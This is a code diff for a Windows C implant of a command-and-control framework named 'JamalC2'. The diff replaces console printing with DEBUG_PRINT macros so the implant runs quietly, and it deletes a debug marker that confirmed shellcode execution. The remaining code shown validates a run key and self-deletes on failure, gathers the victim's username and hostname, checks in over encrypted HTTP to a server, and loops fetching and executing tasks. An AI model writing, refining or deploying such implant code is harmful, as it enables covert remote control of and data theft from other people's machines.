@@ -161,7 +161,8 @@ static void handle_task(Task *task) {
       snprintf(msg, sizeof(msg), "Beacon interval set to %d seconds",
                new_interval);
       result = safe_strdup(msg);
-      printf("    [*] Beacon interval changed to %d seconds\n", new_interval);
+      DEBUG_PRINT("    [*] Beacon interval changed to %d seconds\n",
+                  new_interval);
     } else {
       result = safe_strdup("Invalid interval");
       success = 0;
@@ -193,14 +194,14 @@ static void handle_task(Task *task) {
 
   // Send result back
   if (result) {
-    printf(
+    DEBUG_PRINT(
         "    [DEBUG] Sending result for task %s: success=%d, output_len=%zu\n",
         task->id, success, strlen(result));
     int send_ret = protocol_send_result(&g_crypto, task->id, success, result);
-    printf("    [DEBUG] Send result returned: %d\n", send_ret);
+    DEBUG_PRINT("    [DEBUG] Send result returned: %d\n", send_ret);
     free(result);
   } else {
-    printf("    [DEBUG] No result to send for task %s\n", task->id);
+    DEBUG_PRINT("    [DEBUG] No result to send for task %s\n", task->id);
   }
 }
 
@@ -212,15 +213,15 @@ static void beacon_loop(void) {
 
     // Get tasks from server
     int beacon_ret = protocol_beacon(&g_crypto, &tasks, &task_count);
-    printf("    [DEBUG] beacon_ret=%d, task_count=%d\n", beacon_ret,
-           task_count);
+    DEBUG_PRINT("    [DEBUG] beacon_ret=%d, task_count=%d\n", beacon_ret,
+                task_count);
 
     if (beacon_ret == 0 && task_count > 0) {
       // Process each task
       for (int i = 0; i < task_count; i++) {
-        printf("    [DEBUG] Processing task %d: id=%s, cmd=%d, args=%s\n", i,
-               tasks[i].id, tasks[i].command,
-               tasks[i].args ? tasks[i].args : "(null)");
+        DEBUG_PRINT("    [DEBUG] Processing task %d: id=%s, cmd=%d, args=%s\n",
+                    i, tasks[i].id, tasks[i].command,
+                    tasks[i].args ? tasks[i].args : "(null)");
         handle_task(&tasks[i]);
       }
       protocol_free_tasks(tasks, task_count);
@@ -232,70 +233,54 @@ static void beacon_loop(void) {
 }
 
 int main(int argc, char *argv[]) {
-  printf("[*] JamalC2 C Implant starting...\n");
-
-#ifdef NDEBUG
-  // DEBUG: Create a file to confirm shellcode is executing
-  // Remove this after debugging
-  {
-    HANDLE hFile =
-        CreateFileA("C:\\Windows\\Temp\\jamal_debug.txt", GENERIC_WRITE, 0,
-                    NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile != INVALID_HANDLE_VALUE) {
-      const char *msg = "Shellcode executed successfully!\r\n";
-      DWORD written;
-      WriteFile(hFile, msg, (DWORD)strlen(msg), &written, NULL);
-      CloseHandle(hFile);
-    }
-  }
-#endif
+  DEBUG_PRINT("[*] JamalC2 C Implant starting...\n");
 
 #if !SKIP_KEY_CHECK
   // Validate run key
   if (argc < 3 || strcmp(argv[1], "-k") != 0 || strcmp(argv[2], RUN_KEY) != 0) {
-    printf("[!] Invalid key, exiting...\n");
+    DEBUG_PRINT("[!] Invalid key, exiting...\n");
     self_delete();
     return 0;
   }
-  printf("[+] Key validated\n");
+  DEBUG_PRINT("[+] Key validated\n");
 #endif
 
   // Initialize crypto
-  printf("[*] Initializing crypto...\n");
+  DEBUG_PRINT("[*] Initializing crypto...\n");
   if (crypto_init(&g_crypto, ENCRYPTION_KEY) != 0) {
-    printf("[!] Crypto init failed\n");
+    DEBUG_PRINT("[!] Crypto init failed\n");
     return 1;
   }
-  printf("[+] Crypto initialized\n");
+  DEBUG_PRINT("[+] Crypto initialized\n");
 
   // Initialize HTTP
-  printf("[*] Initializing HTTP...\n");
+  DEBUG_PRINT("[*] Initializing HTTP...\n");
   if (http_init() != 0) {
-    printf("[!] HTTP init failed\n");
+    DEBUG_PRINT("[!] HTTP init failed\n");
     return 1;
   }
-  printf("[+] HTTP initialized\n");
+  DEBUG_PRINT("[+] HTTP initialized\n");
 
   // Initial checkin
-  printf("[*] Getting system info...\n");
+  DEBUG_PRINT("[*] Getting system info...\n");
   SystemInfo info;
   protocol_get_sysinfo(&info);
-  printf("[+] System info: %s@%s\n", info.username, info.hostname);
+  DEBUG_PRINT("[+] System info: %s@%s\n", info.username, info.hostname);
 
-  printf("[*] Attempting checkin to %s:%d...\n", SERVER_HOST, SERVER_PORT);
+  DEBUG_PRINT("[*] Attempting checkin to %s:%d...\n", SERVER_HOST, SERVER_PORT);
   int checkin_result = protocol_checkin(&g_crypto, &info);
   if (checkin_result != 0) {
-    printf("[!] Checkin failed (code: %d), retrying in %d seconds...\n",
-           checkin_result, RECONNECT_DELAY);
+    DEBUG_PRINT("[!] Checkin failed (code: %d), retrying in %d seconds...\n",
+                checkin_result, RECONNECT_DELAY);
     Sleep(RECONNECT_DELAY * 1000);
   } else {
-    printf("[+] Checkin successful!\n");
+    DEBUG_PRINT("[+] Checkin successful!\n");
   }
 
   protocol_free_sysinfo(&info);
 
   // Enter beacon loop
-  printf("[*] Entering beacon loop...\n");
+  DEBUG_PRINT("[*] Entering beacon loop...\n");
   beacon_loop();
 
   // Cleanup (never reached)
